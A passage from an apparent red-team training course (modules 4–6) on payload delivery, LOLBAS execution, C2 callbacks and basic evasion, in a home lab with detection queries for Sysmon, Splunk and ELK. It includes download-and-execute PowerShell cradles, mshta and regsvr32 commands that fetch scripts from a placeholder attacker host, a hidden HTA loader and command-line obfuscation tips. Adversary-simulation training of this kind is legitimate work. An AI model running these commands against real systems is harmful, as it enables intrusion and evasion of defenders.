mycalc.exe\ndonut mycalc.exe -o mycalc.bin\n</code></pre>\nThe output <code>mycalc.bin</code> is raw shellcode. You would then need another technique (like process injection) to execute this shellcode on the target. This is a common technique seen in more advanced attacks.</li>\n</ul>\n<h4>4.4 Encoding and Basic Obfuscation for Delivery</h4>\n<p>While Module 6 goes deep into evading AV/EDR signatures on the payload <em>itself</em>, this module touches on basic techniques to make the <em>delivery command</em> or the <em>script used for delivery</em> less obvious.</p>\n<ul>\n<li><strong>Goal:</strong> Avoid detection based on easily recognizable strings in command lines or simple scripts.</li>\n<li><strong>Techniques:</strong><ul>\n<li><strong>Base64 Encoding:</strong> Commonly used for PowerShell scripts. The <code>-EncodedCommand</code> argument in PowerShell allows executing a base64 encoded string.<pre><code class=\"language-bash\"># Original command:\n# IEX(New-Object Net.WebClient).DownloadString(&#39;http://&lt;Attacker_IP&gt;/script.ps1&#39;)\n\n# Encode it (using PowerShell itself or online tools):\n# [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://&lt;Attacker_IP&gt;/script.ps1&#39;)&quot;))\n\n# Execution command using encoded string:\npowershell.exe -nop -w hidden -enc &lt;base64_string&gt;\n</code></pre>\nThis makes the command line look like gibberish to simple string scanners, although defenders look for <code>-enc</code> and decode it.</li>\n<li><strong>Simple String Manipulation/Obfuscation:</strong> In scripts (VBScript, JScript, PowerShell), you can break up strings, concatenate them, use character codes, etc., to hide commands or URLs.<pre><code class=\"language-vbs\">&#39; Example in VBScript (for HTA):\n&#39; Original: CreateObject(&quot;Wscript.Shell&quot;).Run &quot;calc.exe&quot;\n&#39; Obfuscated:\ncmd = &quot;calc&quot; &amp; &quot;.exe&quot;\nCreateObject(&quot;Wscript.Shell&quot;).Run cmd\n</code></pre>\nThis is a trivial example, but adversaries use much more complex versions.</li>\n</ul>\n</li>\n</ul>\n<p>These basic techniques are often just enough to bypass simple static analysis on the delivery file or command line.</p>\n<h4>Connecting to Your Infrastructure (Module 3 Review)</h4>\n<p>Remember that web server or SMB share you set up in Module 3? This is where your payload files (HTA, LNK, <code>.exe</code>, <code>.ps1</code>, etc.) will live so the target machine can access them.</p>\n<ul>\n<li>If you&#39;re using an HTA delivered via <code>mshta http://...</code>, the HTA file needs to be on your web server.</li>\n<li>If you&#39;re delivering an <code>.exe</code> or <code>.ps1</code> file for the target to download, it needs to be hosted on your web server or SMB share.</li>\n<li>If you&#39;re using an ISO/IMG, the malicious files go <em>inside</em> the ISO, which is then hosted (e.g., on the web server).</li>\n</ul>\n<p>This module is about preparing the payload and understanding the <em>mechanism</em> to get it there. Module 5 is about triggering that mechanism!</p>\n<hr>\n<h3>Module Project/Exercise: Craft and Host a Test Payload</h3>\n<p>Alright team, time to get hands-on and build our first piece of the attack chain! We&#39;re going to create a simple payload and host it so it&#39;s ready for execution in the next module.</p>\n<p><strong>Project 4.1: Create and Host a Test Payload</strong></p>\n<p><strong>Objective:</strong> Generate a simple, stageless payload and make it accessible to your target VM via a chosen delivery vector, leveraging the infrastructure built in Module 3.</p>\n<p><strong>Steps:</strong></p>\n<ol>\n<li><p><strong>Choose Your Simple Payload Action:</strong> For this test, we don&#39;t need a full C2 callback yet. A simple action like running <code>calc.exe</code> or running a command that touches a file will suffice to demonstrate execution. Let&#39;s aim for a PowerShell command that runs <code>calc.exe</code>.</p>\n<pre><code>powershell.exe -nop -w hidden -c &quot;Start-Process calc.exe&quot;\n</code></pre>\n<p><em>(<code>-nop</code>: No profile, <code>-w hidden</code>: Window hidden, <code>-c</code>: Command)</em></p>\n</li>\n<li><p><strong>Choose ONE Delivery Method:</strong> Select one method from Section 4.3 that you want to implement. HTA and LNK are good starting points as they are relatively simple to demonstrate hosting. Let&#39;s use <strong>HTA</strong> for this example walkthrough, as it combines hosting and script execution nicely.</p>\n</li>\n<li><p><strong>Craft the Payload Script/File:</strong> Based on your chosen method (HTA) and payload action (run <code>calc.exe</code> via PowerShell), create the necessary file.</p>\n<ul>\n<li><p><strong>For HTA:</strong> Create a file named <code>run_calc.hta</code> with the following content:</p>\n<pre><code class=\"language-html\">&lt;!-- run_calc.hta --&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Loading...&lt;/title&gt;\n&lt;HTA:APPLICATION\n    APPLICATIONNAME=&quot;Loader&quot;\n    WINDOWSTATE=&quot;hidden&quot;\n    SHOWINTASKBAR=&quot;no&quot;\n    BORDER=&quot;none&quot;\n    SINGLEINSTANCE=&quot;yes&quot;\n&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;script language=&quot;VBScript&quot;&gt;\n&#39; Define the PowerShell command\n&#39; We use Chr() to break up the string and make it slightly less obvious\n&#39; This is basic obfuscation!\nps_cmd = &quot;powershell.exe -nop -w hidden -c &quot;&quot;Start-Process calc.exe&quot;&quot;&quot;\n\n&#39; Execute the command\nCreateObject(&quot;Wscript.Shell&quot;).Run ps_cmd, 0 &#39; The &#39;0&#39; means hide the window\n\n&#39; Exit the HTA application\nwindow.close()\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p><em>Self-Correction:</em> Using <code>Chr()</code> for obfuscation might be a bit much for &quot;basic&quot; in this context. Let&#39;s simplify the VBScript for clarity in this foundational step, focusing just on the delivery mechanism. We&#39;ll add obfuscation in Module 6.</p>\n<p><strong>Revised <code>run_calc.hta</code> (Simpler):</strong></p>\n<pre><code class=\"language-html\">&lt;!-- run_calc.hta --&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Loading...&lt;/title&gt;\n&lt;HTA:APPLICATION\n    APPLICATIONNAME=&quot;Loader&quot;\n    WINDOWSTATE=&quot;hidden&quot;\n    SHOWINTASKBAR=&quot;no&quot;\n    BORDER=&quot;none&quot;\n    SINGLEINSTANCE=&quot;yes&quot;\n&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;script language=&quot;VBScript&quot;&gt;\n&#39; Execute the PowerShell command directly\nCreateObject(&quot;Wscript.Shell&quot;).Run &quot;powershell.exe -nop -w hidden -c &quot;&quot;Start-Process calc.exe&quot;&quot;&quot;, 0\n\n&#39; Exit the HTA application\nwindow.close()\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p><em>Okay, this is much clearer for demonstrating the HTA delivery mechanism itself.</em></p>\n</li>\n</ul>\n</li>\n<li><p><strong>Host the Payload:</strong> Use the web server you set up in Module 3.</p>\n<ul>\n<li>Access your Linux VM/server (your C2 infrastructure host).</li>\n<li>Navigate to the web server&#39;s root directory (e.g., <code>/var/www/html/</code> for Apache, <code>/usr/share/nginx/html/</code> for Nginx).</li>\n<li>Copy the <code>run_calc.hta</code> file into this directory.</li>\n<li>Ensure your web server service is running (<code>sudo systemctl start apache2</code> or <code>sudo systemctl start nginx</code>).</li>\n</ul>\n</li>\n<li><p><strong>Verify Accessibility (Optional but Recommended):</strong> From your <em>target workstation VM</em> (or even your attacker machine), try to access the file using a web browser or <code>curl</code>.</p>\n<ul>\n<li>Open a browser on the target VM and go to <code>http://&lt;Your_C2_Infrastructure_Public_IP_or_Internal_IP&gt;/run_calc.hta</code>.</li>\n<li>The browser might download the file, or if configured to handle HTAs, might try to run it (cancel it for now!). The point is to verify the file is accessible over HTTP. If it downloads or shows the code, success! If not, check your web server configuration, firewall rules, and IP addresses.</li>\n</ul>\n</li>\n</ol>\n<p><strong>Troubleshooting Tip:</strong> Make sure the IP address you&#39;re using in the URL (<code>&lt;Your_C2_Infrastructure_Public_IP_or_Internal_IP&gt;</code>) is reachable from the target VM. If your C2 server is a cloud VM, you might need its public IP. If it&#39;s a Linux VM in your local lab, use its internal network IP.</p>\n<p><strong>Project Output:</strong> At the end of this project, you should have your <code>run_calc.hta</code> file sitting on your web server, ready to be accessed and executed by the target machine in the next module. You should also understand <em>why</em> you chose that delivery method and how the payload works.</p>\n<p><strong>Contribution to Capstone:</strong> This project provides the crucial component – the payload and the mechanism to get it delivered – that will be used in Module 5 to achieve initial execution and get a callback (or in this case, run <code>calc.exe</code> as a demonstration). It directly integrates with your Module 3 infrastructure.</p>\n<hr>\n<p>Fantastic work, team! You&#39;ve now got your hands dirty creating a simple payload and setting up the initial delivery mechanism. Understanding these different vectors is crucial because real adversaries tailor their approach based on the target environment and their access.</p>\n<p>In the next module, Module 5, we&#39;re going to take this hosted payload and <em>execute</em> it on our target machine using some of those built-in Windows binaries we talked about (LOLBAS). This is where we&#39;ll see our first simulated &quot;compromise&quot; and observe what it looks like in our logging infrastructure!</p>\n<p>Get your <code>run_calc.hta</code> file ready on your web server. We&#39;re about to light the fuse!</p>\n\n                </div>\n             </div>\n         ",
    "module-5": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 5: module_5</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, buckle up! We&#39;ve laid the groundwork, built our digital playground, set up our comms tower, and even prepped our little packages of code. Now? Now is where the rubber meets the road. This is Module 5: Initial Execution and Callbacks. This is the moment we get our code running on a target system and establish that crucial first link back to our C2 infrastructure. Think of it as landing the drone and getting the first blurry video feed back to base. It&#39;s exciting, it&#39;s challenging, and it&#39;s where we start to see the fruits of our planning and infrastructure work!</p>\n<hr>\n<h2>CRTO Prep Part 1: Adversary Simulation Foundations</h2>\n<h3>Module 5: Initial Execution and Callbacks</h3>\n<p><strong>Overall Module Objective:</strong> By the end of this module, learners will be able to execute a payload on a target machine using Living Off The Land Binaries/Scripts (LOLBAS) and establish a functional initial callback to their C2 infrastructure, observing the activity in their logging system.</p>\n<p><strong>Why is this Module Critical?</strong></p>\n<p>Getting your code to run on a target machine is the <em>goal</em> of Initial Access. Without successful execution, all the fancy infrastructure and perfectly crafted payloads are useless. This module dives into <em>how</em> attackers achieve that first execution, focusing on techniques that leverage tools already present on the system to blend in – the &quot;Living Off The Land&quot; philosophy. We&#39;ll also see how that initial connection (&quot;the callback&quot;) looks and, importantly, how defenders might spot it using the logs we set up in Module 2.</p>\n<hr>\n<h4><strong>Essential Subtopics Deep Dive:</strong></h4>\n<p>Let&#39;s break down each key concept and get our hands dirty (metaphorically, for now!).</p>\n<h5><strong>5.1 Understanding Living Off The Land Binaries and Scripts (LOLBAS)</strong></h5>\n<ul>\n<li><strong>What are LOLBAS/LOLBINS?</strong><ul>\n<li>These are legitimate Windows executables, scripts, or libraries that are part of the standard operating system installation.</li>\n<li>Think of tools like <code>powershell.exe</code>, <code>cmd.exe</code>, <code>mshta.exe</code>, <code>rundll32.exe</code>, <code>regsvr32.exe</code>, <code>bitsadmin.exe</code>, <code>certutil.exe</code>, etc.</li>\n</ul>\n</li>\n<li><strong>Why do attackers use them?</strong><ul>\n<li><strong>Stealth:</strong> They are signed Microsoft binaries. Security software (AV/EDR) is less likely to flag the <em>binary itself</em> as malicious. Detection has to rely on <em>how</em> the binary is used (command line, network connections, behavior).</li>\n<li><strong>Availability:</strong> They are always there on a standard Windows install. No need to drop extra tools that might be fingerprinted or caught by static analysis.</li>\n<li><strong>Functionality:</strong> Many LOLBAS provide powerful capabilities like downloading files, executing code, interacting with the network, modifying the registry, etc. Attackers can chain these together to perform complex tasks.</li>\n</ul>\n</li>\n<li><strong>The Philosophy:</strong> It&#39;s about minimizing the attacker&#39;s footprint and relying on the victim&#39;s own tools against them. Instead of bringing a crowbar (custom malware), you use a screwdriver that was already in the toolbox (LOLBAS).</li>\n<li><strong>Resource:</strong> The LOLBAS Project website (lolbas-project.github.io) is an <em>invaluable</em> resource. It&#39;s a community-driven repository documenting how attackers have abused these legitimate binaries and scripts. Get familiar with it!</li>\n</ul>\n<h5><strong>5.2 Using <code>mshta.exe</code> for Execution</strong></h5>\n<ul>\n<li><strong>What it is:</strong> Microsoft HTML Application host. It&#39;s designed to run <code>.hta</code> files, which are basically HTML pages that can contain scripting languages like VBScript or JScript.</li>\n<li><strong>Why attackers use it:</strong> <code>mshta.exe</code> can execute scripts directly from a <em>remote URL</em>. This is a classic technique because it allows execution without writing a script file to disk first (though the HTA content itself is often cached). It bypasses execution policies that might affect <code>.vbs</code> or <code>.js</code> files directly.</li>\n<li><strong>Common Syntax:</strong><pre><code class=\"language-bash\">mshta.exe &lt;path_to_hta_file_or_url&gt;\n</code></pre>\nOr, to execute inline script (often used with <code>javascript:</code> or <code>vbscript:</code> pseudo-protocols):<pre><code class=\"language-bash\">mshta.exe javascript:&lt;code&gt;\nmshta.exe vbscript:&lt;code&gt;\n</code></pre>\n</li>\n<li><strong>Examples:</strong><ul>\n<li><strong>Executing a remote HTA file:</strong> If you hosted <code>payload.hta</code> on your C2 web server (<code>http://&lt;your_c2_ip&gt;/payload.hta</code>):<pre><code class=\"language-bash\">mshta http://&lt;your_c2_ip&gt;/payload.hta\n</code></pre>\n</li>\n<li><strong>Executing inline VBScript:</strong> This example pops a message box and then closes the <code>mshta</code> window.<pre><code class=\"language-bash\">mshta vbscript:Execute(&quot;MsgBox &quot;&quot;Hello from MSHTA!&quot;&quot;:close&quot;)\n</code></pre>\n</li>\n<li><strong>Executing a remote scriptlet (.sct) via MSHTA (less common now, but conceptually similar to regsvr32):</strong><pre><code class=\"language-bash\">mshta javascript:GetObject(&quot;script:http://&lt;your_c2_ip&gt;/payload.sct&quot;)(window.close)\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Detection Focus:</strong> Look for <code>mshta.exe</code> process creation. <em>Crucially</em>, examine the command line arguments. Is it pointing to a remote URL? Is it executing suspicious inline script? Sysmon Event ID 1 (Process Create) is your friend here. Also, Sysmon Event ID 3 (Network Connection) will show the connection to download the HTA or scriptlet.</li>\n</ul>\n<h5><strong>5.3 Using <code>rundll32.exe</code> for Executing DLL Entry Points</strong></h5>\n<ul>\n<li><strong>What it is:</strong> A legitimate Windows utility used to load and run functions from 32-bit Dynamic Link Libraries (DLLs). It&#39;s not a standalone program runner; it needs a DLL and a specific function within that DLL to execute.</li>\n<li><strong>Why attackers use it:</strong> Attackers can craft malicious DLLs with specific exported functions (<code>DllRegisterServer</code>, <code>DllInstall</code>, or custom functions) that contain their payload code. Running this via <code>rundll32</code> makes the execution appear to originate from a standard Windows binary, potentially evading detection based purely on the executable name.</li>\n<li><strong>Common Syntax:</strong><pre><code class=\"language-bash\">rundll32.exe &lt;dllname&gt;,&lt;entrypoint&gt; &lt;optional_arguments&gt;\n</code></pre>\nThe <code>&lt;entrypoint&gt;</code> is the name of the exported function in the DLL that <code>rundll32</code> will call. <code>DllRegisterServer</code> and <code>DllInstall</code> are common choices because they are standard export names, making the command line look less immediately suspicious.</li>\n<li><strong>Examples:</strong><ul>\n<li><strong>Executing a custom malicious DLL:</strong> If you have a malicious DLL named <code>evil.dll</code> in <code>C:\\temp</code> with an exported function <code>EntryPoint</code>:<pre><code class=\"language-bash\">rundll32.exe C:\\temp\\evil.dll,EntryPoint\n</code></pre>\n</li>\n<li><strong>Executing using a standard export name:</strong><pre><code class=\"language-bash\">rundll32.exe C:\\temp\\evil.dll,DllRegisterServer\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Detection Focus:</strong> <code>rundll32.exe</code> process creation (Sysmon Event ID 1). <em>Again</em>, the command line is key – what DLL is it loading? Is the DLL path suspicious (e.g., in a temporary directory)? Sysmon Event ID 7 (Image Load) is <em>critical</em> here, showing what DLLs are loaded into the <code>rundll32.exe</code> process. Look for unfamiliar or suspicious DLLs loaded by <code>rundll32</code>.</li>\n</ul>\n<h5><strong>5.4 Using <code>regsvr32.exe</code> for Executing COM Scriptlets</strong></h5>\n<ul>\n<li><strong>What it is:</strong> A command-line utility to register and unregister OLE controls (like DLLs and ActiveX controls) in the Windows Registry.</li>\n<li><strong>Why attackers use it:</strong> <code>regsvr32.exe</code> can execute Scriptlets (<code>.sct</code> files) via the <code>/i</code> flag when used with <code>scrobj.dll</code>. Similar to <code>mshta</code>, this allows executing scripts (VBScript/JScript) potentially hosted on a remote server, often bypassing traditional script execution restrictions. This was a significant bypass technique for a while.</li>\n<li><strong>Common Syntax:</strong><pre><code class=\"language-bash\">regsvr32.exe /s /n /u /i:&lt;url_to_sct_file&gt; scrobj.dll\n</code></pre>\n<ul>\n<li><code>/s</code>: Silent mode (no message boxes).</li>\n<li><code>/n</code>: Do not call <code>DllRegisterServer</code>.</li>\n<li><code>/u</code>: Unregister the DLL (this is counter-intuitive but necessary for the <code>/i</code> flag to work with <code>scrobj.dll</code>).</li>\n<li><code>/i:&lt;url&gt;</code>: Call <code>DllInstall</code> and pass the URL as a parameter.</li>\n<li><code>scrobj.dll</code>: The COM object that knows how to process <code>.sct</code> files.</li>\n</ul>\n</li>\n<li><strong>Examples:</strong><ul>\n<li><strong>Executing a remote SCT file:</strong> If you hosted <code>payload.sct</code> on your C2 web server:<pre><code class=\"language-bash\">regsvr32 /s /n /u /i:http://&lt;your_c2_ip&gt;/payload.sct scrobj.dll\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Detection Focus:</strong> <code>regsvr32.exe</code> process creation (Sysmon Event ID 1). Look for the presence of <code>scrobj.dll</code> and the <code>/i</code> flag with a URL in the command line. Sysmon Event ID 3 (Network Connection) will show the download of the <code>.sct</code> file.</li>\n</ul>\n<h5><strong>5.5 Other Common LOLBAS for Execution (<code>powershell.exe</code>, <code>cscript.exe</code>, <code>wscript.exe</code>)</strong></h5>\n<ul>\n<li><strong><code>powershell.exe</code>:</strong><ul>\n<li><strong>What it is:</strong> Microsoft&#39;s task automation and configuration management framework shell.</li>\n<li><strong>Why attackers use it:</strong> It&#39;s incredibly powerful, has access to the full .NET framework, can interact deeply with the OS, download/upload files, execute code in memory, and much more. It&#39;s the go-to tool for many post-exploitation tasks and initial execution.</li>\n<li><strong>Key Execution Flags:</strong><ul>\n<li><code>-NoProfile</code>: Skips loading the PowerShell profile, making execution faster and potentially avoiding detection based on profile modifications.</li>\n<li><code>-WindowStyle Hidden</code>: Prevents a PowerShell window from popping up.</li>\n<li><code>-ExecutionPolicy Bypass</code>: Allows scripts to run, bypassing the configured execution policy.</li>\n<li><code>-EncodedCommand &lt;base64&gt;</code>: Executes a base64 encoded string as a PowerShell command. This is a common obfuscation technique for command lines.</li>\n<li><code>-c</code> or <code>-Command</code>: Executes the specified command(s).</li>\n</ul>\n</li>\n<li><strong>Examples:</strong><ul>\n<li><strong>Simple Command (hidden):</strong><pre><code class=\"language-bash\">powershell.exe -WindowStyle Hidden -Command &quot;Write-Host &#39;Hello from PowerShell!&#39;&quot;\n</code></pre>\n</li>\n<li><strong>Download and Execute (In-Memory):</strong> This is a very common pattern. <code>New-Object Net.WebClient</code> downloads content, <code>DownloadString</code> gets it as a string, and <code>IEX</code> (Invoke-Expression) executes that string as PowerShell code.<pre><code class=\"language-bash\">powershell.exe -WindowStyle Hidden -Exec Bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://&lt;your_c2_ip&gt;/payload.ps1&#39;)&quot;\n</code></pre>\n</li>\n<li><strong>Executing an Encoded Command:</strong> First, encode a command: <code>[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&quot;Write-Host &#39;Hello Encoded!&#39;&quot;))</code> (Note: PowerShell uses UTF-16 Little Endian for encoding). Then execute:<pre><code class=\"language-bash\">powershell.exe -WindowStyle Hidden -Exec Bypass -EncodedCommand &lt;paste_base64_here&gt;\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Detection Focus:</strong> <code>powershell.exe</code> process creation (Sysmon Event ID 1). Command line analysis (Sysmon Event ID 1, Security Event ID 4688). <em>Crucially</em>, PowerShell Script Block Logging (Event ID 4104) can capture the <em>deobfuscated</em> script content being executed, even if the command line is encoded. AMSI (Antimalware Scan Interface) is also designed to hook into PowerShell and scan scripts <em>before</em> they execute (more on bypassing this later).</li>\n</ul>\n</li>\n<li><strong><code>cscript.exe</code> and <code>wscript.exe</code>:</strong><ul>\n<li><strong>What they are:</strong> Script hosts for VBScript and JScript files (<code>.vbs</code>, <code>.js</code>, <code>.wsf</code>). <code>cscript</code> is the command-line version, <code>wscript</code> is the GUI version.</li>\n<li><strong>Why attackers use them:</strong> Can execute script files, potentially downloaded from a remote source. Similar to <code>mshta</code> but typically requires the script file to be present locally (though techniques exist to execute remotely).</li>\n<li><strong>Syntax:</strong><pre><code class=\"language-bash\">cscript.exe &lt;path_to_script_file&gt;\nwscript.exe &lt;path_to_script_file&gt;\n</code></pre>\n</li>\n<li><strong>Examples:</strong><ul>\n<li><strong>Executing a downloaded VBScript:</strong><pre><code class=\"language-bash\">cscript C:\\temp\\payload.vbs\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Detection Focus:</strong> <code>cscript.exe</code> or <code>wscript.exe</code> process creation (Sysmon Event ID 1). Command line analysis showing the script path. File creation logs if the script was downloaded.</li>\n</ul>\n</li>\n</ul>\n<h5><strong>5.6 Command Line Execution Techniques and Obfuscation</strong></h5>\n<ul>\n<li><strong>Why Obfuscate Command Lines?</strong> Defenders and security tools heavily monitor command lines. Default or simple malicious command lines (like a direct URL download) are easy to spot. Obfuscation aims to make the command line look benign or confusing to automated tools and human analysts.</li>\n<li><strong>Basic Techniques (beyond PowerShell -EncodedCommand):</strong><ul>\n<li><strong>Using Environment Variables:</strong> Instead of <code>C:\\temp\\payload.exe</code>, use <code>%TEMP%\\payload.exe</code>.</li>\n<li><strong>Concatenation:</strong> Break up strings using variables or string manipulation within scripts or batch files (e.g., <code>set p=power &amp; set s=shell.exe &amp; %p%%s% ...</code>). This is less effective against modern EDR but a foundational concept.</li>\n<li><strong>Shortening/Changing Case:</strong> Using 8.3 filenames (<code>PROGRA~1</code> instead of <code>Program Files</code>), changing case (<code>MsHtA</code> instead of <code>mshta</code>). Again, less effective standalone but part of a layered approach.</li>\n<li><strong>Encoding (outside of PowerShell):</strong> Simple base64 or hex encoding of strings <em>within</em> a script or configuration file that is then decoded by the script/tool itself.</li>\n</ul>\n</li>\n<li><strong>Think About:</strong> How would you make <code>mshta http://&lt;your_c2_ip&gt;/payload.hta</code> slightly harder to spot on the command line? Maybe store the URL in a variable in a batch file that then calls <code>mshta</code>? <code>set url=http://&lt;your_c2_ip&gt;/payload.hta &amp; mshta %url%</code> (Still simple, but you get the idea).</li>\n<li><strong>Detection Focus:</strong> This is an arms race. Security tools look for patterns, known malicious strings, high-entropy encoded strings, and analyze the <em>behavior</em> initiated by the command (network connections, file modifications, process injection, etc.) rather than just the literal string.</li>\n</ul>\n<h5><strong>5.7 Understanding the Initial Callback Process</strong></h5>\n<ul>\n<li><strong>What is a Callback?</strong> After your payload executes on the target machine, it needs to communicate <em>back</em> to your C2 server to receive further instructions and send back collected data. This initiated connection from the victim to the attacker is the &quot;callback.&quot;</li>\n<li><strong>Why Callback (vs. Bind Shell)?</strong> A &quot;bind shell&quot; opens a listener on the target, and the attacker connects <em>to</em> it. This is often blocked by firewalls (inbound connections are heavily restricted). A &quot;reverse shell&quot; or &quot;callback&quot; initiates the connection <em>outbound</em> from the target to the attacker&#39;s listener. Outbound connections (especially on standard ports like 80, 443, 53) are much more likely to be allowed by firewalls.</li>\n<li><strong>The Process Flow:</strong><ol>\n<li>Payload executes on Target VM (Module 5).</li>\n<li>The payload&#39;s code includes instructions to connect back to a specific IP address and port (your C2 or Redirector IP/Port, configured in Module 4 payload).</li>\n<li>The Target VM initiates an outbound network connection (e.g., TCP SYN) to your Redirector IP/Port (Module 3).</li>\n<li>The Redirector (e.g., Apache/Nginx with mod_rewrite/proxy_pass, or Socat) receives the connection.</li>\n<li>The Redirector forwards the connection to your actual C2 Server&#39;s internal IP/Port (Module 3).</li>\n<li>Your C2 Framework (e.g., Mythic, Sliver, or conceptually, your simple listener) receives the incoming connection.</li>\n<li>If the C2 framework recognizes the connection as a valid implant beacon (based on malleable profile settings, if any - Module 7), it establishes the session.</li>\n<li>You now have a &quot;shell&quot; or &quot;beacon&quot; from the target machine in your C2 framework interface. Success!</li>\n</ol>\n</li>\n<li><strong>Role of the Redirector:</strong> The redirector is crucial OpSec (Operational Security). It hides the real IP address of your C2 server. If the target organization or security researchers identify the connection and investigate the IP, they hit your disposable redirector, not your main C2 server, which preserves your main infrastructure for future operations.</li>\n<li><strong>Detection Focus:</strong> This is where network monitoring comes in. Sysmon Event ID 3 (Network Connection) is the primary source. Look for outbound connections from suspicious processes (identified in Event ID 1) to external IPs/ports that are unusual for that process or machine. Firewall logs, network IDS/IPS alerts would also fire here.</li>\n</ul>\n<h5><strong>5.8 Monitoring Initial Execution and Callbacks in the SIEM (Splunk/ELK)</strong></h5>\n<ul>\n<li><strong>Recap:</strong> You built a lab with a Domain Controller, a Target Workstation, installed Sysmon on the workstation, and set up log forwarding to Splunk Free or ELK in Module 2. Now we use it!</li>\n<li><strong>What to Search For:</strong><ul>\n<li><strong>Execution:</strong><ul>\n<li><strong>Search Query Concept:</strong> Find process creation events originating from interactive logon sessions or suspicious sources, where the <code>Image</code> (process name) is one of our target LOLBAS (<code>mshta.exe</code>, <code>rundll32.exe</code>, <code>regsvr32.exe</code>, <code>powershell.exe</code>, <code>cscript.exe</code>, <code>wscript.exe</code>).</li>\n<li><strong>Splunk Example:</strong> <code>EventCode=1 OR EventCode=4688 | where Image=&quot;*\\\\mshta.exe&quot; OR Image=&quot;*\\\\rundll32.exe&quot; OR Image=&quot;*\\\\regsvr32.exe&quot; OR Image=&quot;*\\\\powershell.exe&quot; OR Image=&quot;*\\\\cscript.exe&quot; OR Image=&quot;*\\\\wscript.exe&quot; | table _time, Hostname, Image, CommandLine, ParentCommandLine</code></li>\n<li><strong>ELK Example (using KQL in Kibana Discover):</strong> <code>event.code : (1 or 4688) and process.executable : (*\\\\mshta.exe or *\\\\rundll32.exe or *\\\\regsvr32.exe or *\\\\powershell.exe or *\\\\cscript.exe or *\\\\wscript.exe)</code> - then inspect the <code>process.command_line</code> field.</li>\n<li><strong>What to Analyze:</strong> Look closely at the <code>CommandLine</code> field for the LOLBAS. Does it contain URLs? Suspicious paths? Base64 encoded strings? Unusual flags?</li>\n</ul>\n</li>\n<li><strong>Callback:</strong><ul>\n<li><strong>Search Query Concept:</strong> Find network connection events (<code>Sysmon Event ID 3</code>) where the <code>SourceImage</code> (the process that initiated the connection) is one of the processes identified in the execution phase, and the <code>DestinationIP</code> and <code>DestinationPort</code> match your C2/Redirector.</li>\n<li><strong>Splunk Example:</strong> `EventCode=3 | where SourceImage=&quot;*\\mshta.exe&quot; OR</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n\n                </div>\n             </div>\n         ",
    "module-6": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 6: module_6</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, settle in! We&#39;ve built our lab, set up our C2 infrastructure, crafted our initial payload, and even achieved that crucial first callback. That&#39;s massive progress! You&#39;ve got code running on a target machine talking back to your server – a true beachhead.</p>\n<p>But here&#39;s the reality check: Defenders aren&#39;t sitting idle. They have tools and systems designed specifically to spot malicious activity. If our payload is screaming &quot;BAD!&quot; or our communication looks completely alien, that beachhead is going to get wiped out fast.</p>\n<p>This is where <strong>evasion</strong> comes in. It&#39;s not about being invisible; it&#39;s about blending in, looking less suspicious, and making it harder for security tools to identify our actions as malicious. In this module, we&#39;re laying the <em>foundational</em> bricks of evasion – understanding <em>why</em> things get caught and applying basic techniques to fly under the radar of common defenses. This isn&#39;t the deep magic yet, but it&#39;s the essential first step to making your simulations more realistic and persistent.</p>\n<p>Let&#39;s dive deep and learn how to make our initial access a little less... obvious.</p>\n<hr>\n<h2>CRTO Prep Part 1: Adversary Simulation Foundations</h2>\n<h3>Module 6: Foundational Evasion Techniques</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will understand basic detection vectors and apply fundamental techniques to evade common security controls like Antivirus (AV) and basic Endpoint Detection and Response (EDR) signatures.</li>\n</ul>\n<hr>\n<h4>6.1 The Adversary&#39;s Challenge: Understanding Detection</h4>\n<p>Before we can evade detection, we need to understand <em>how</em> detection works. Think of security tools like watchful guards looking for specific things. What are they looking for?</p>\n<ul>\n<li><strong>Antivirus (AV):</strong> Traditionally focused on <em>signatures</em>. It has a database of known malicious files (like a list of fingerprints). If a file&#39;s hash or a specific sequence of bytes within a file matches an entry in the database, <em>BAM!</em> Detected. Modern AVs also use <em>heuristics</em> (looking for suspicious <em>characteristics</em> or <em>patterns</em> in code, even if the specific signature isn&#39;t known) and some behavioral analysis.</li>\n<li><strong>Endpoint Detection and Response (EDR):</strong> These are more sophisticated. They focus heavily on <em>behavior</em>. They monitor processes, network connections, file system changes, registry modifications, API calls, and much more. They look for sequences of events that, when chained together, look like known malicious activity (Threat Hunting Rules, Behavioral Analytics). They often leverage advanced logging like ETW (Event Tracing for Windows) and integrate with centralized logging systems (SIEMs) for correlation.</li>\n</ul>\n<p><strong>Common Detection Vectors (Where security tools look):</strong></p>\n<ol>\n<li><strong>File Signatures:</strong> The bytes on disk or in memory that match a known bad file. (e.g., <code>msfvenom</code> defaults are often heavily signatured).</li>\n<li><strong>In-Memory Signatures:</strong> Malicious code loaded directly into memory might have patterns that AV/EDR can scan for within the process&#39;s memory space.</li>\n<li><strong>API Hooking / Monitoring:</strong> Attackers often use specific Windows API functions (like <code>CreateRemoteThread</code>, <code>WriteProcessMemory</code>, <code>NtAllocateVirtualMemory</code>) to perform malicious actions (like process injection). Security tools can &quot;hook&quot; these functions or monitor their usage by processes to spot suspicious activity.</li>\n<li><strong>Command Line Analysis:</strong> The arguments passed to legitimate Windows binaries (LOLBAS) or scripts can be highly indicative of malicious intent. Running <code>powershell -exec bypass -encodedcommand &lt;base64_string&gt;</code> is a classic example that&#39;s 